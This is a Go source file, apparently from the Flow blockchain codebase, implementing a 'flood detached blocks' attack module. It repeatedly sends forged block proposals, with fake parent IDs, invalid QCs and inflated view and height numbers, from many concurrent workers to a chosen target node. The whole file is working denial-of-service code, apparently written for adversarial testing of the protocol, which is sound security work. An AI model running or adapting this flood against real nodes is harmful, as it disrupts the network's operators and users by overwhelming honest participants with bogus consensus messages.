package attacks

import (
	"sync/atomic"
	"time"

	"github.com/rs/zerolog"

	"github.com/onflow/flow-go/model/flow"
	"github.com/onflow/flow-go/model/messages"
	"github.com/onflow/flow-go/network"
	"github.com/onflow/flow-go/state/protocol"
	"github.com/onflow/flow-go/utils/unittest"
)

// Flood a target victim node with blocks which have a fake parent ID (do not attach
// to the finalized state).
//  - The attached QC must be invalid (is not checked)
//  - Whether the block is the leader is not checked
//

// TargetIDFlag sets the target of the attack. If empty, then no attack occurs
var TargetIDFlag string
var BlocksPerRoundFlag uint
var RoundDurationFlag time.Duration

func RunAttackFloodDetachedBlocks(log zerolog.Logger, conduit network.Conduit, state protocol.State) {

	log = log.With().
		Str("attack_module", "flood_detached_blocks").
		Str("target", TargetIDFlag).
		Uint("blocks_per_round", BlocksPerRoundFlag).
		Dur("round_dur", RoundDurationFlag).
		Logger()

	defer func() {
		log.Warn().Msgf("attack routine is exiting!")
	}()

	if TargetIDFlag == "" {
		log.Info().Msgf("no attack target specified")
	}
	target, err := flow.HexStringToIdentifier(TargetIDFlag)
	if err != nil {
		log.Err(err).Msg("unparseable attack target")
		return
	}

	log = log.With().Str("target", target.String()).Logger()

	targetIdentity, err := state.Final().Identity(target)
	if err != nil {
		log.Err(err).Msg("unknown target ID")
		return
	}

	log.Info().
		Str("role", targetIdentity.Role.String()).
		Str("netw_addr", targetIdentity.Address).
		Msgf("beginning attack against target")

	round := 0
	for {
		round++
		final, err := state.Final().Head()
		if err != nil {
			panic(err)
		}
		log.Info().Msgf("starting attack round %d with finalized block %d", round, final.Height)

		block := createAttackProposal(final)
		workersDone := uint64(0)
		workersTotal := BlocksPerRoundFlag
		for i := 0; i < int(workersTotal); i++ {
			go func() {
				err := conduit.Publish(messages.NewBlockProposal(adjustBlock(block)), target)
				if err != nil {
					log.Err(err).Msg("error sending attack block")
				}
				log.Debug().Msg("sent attack block")
				atomic.AddUint64(&workersDone, 1)
			}()
		}
		log.Info().Msgf("initiated attack workers - going to sleep for %s", RoundDurationFlag.String())
		time.Sleep(RoundDurationFlag)
		log.Info().Msgf("completed attack round %d after %s with %d/%d attack workers completed", round, RoundDurationFlag.String(), workersDone, workersTotal)
	}
}

func adjustBlock(block *flow.Block) *flow.Block {
	modifiedBlock := *block                                // copy the block struct
	modifiedHeader := *block.Header                        // copy the header struct
	modifiedHeader.ParentID = unittest.IdentifierFixture() // modify parent ID in the copy
	modifiedBlock.Header = &modifiedHeader
	return &modifiedBlock
}

func createAttackProposal(final *flow.Header) *flow.Block {
	block := unittest.BlockWithParentFixture(final)
	block.Header.View = final.View + 5000
	block.Header.Height = final.Height + 5000
	block.Header.ParentView = final.View + 4000
	block.Header.ParentID = unittest.IdentifierFixture()
	return block
}
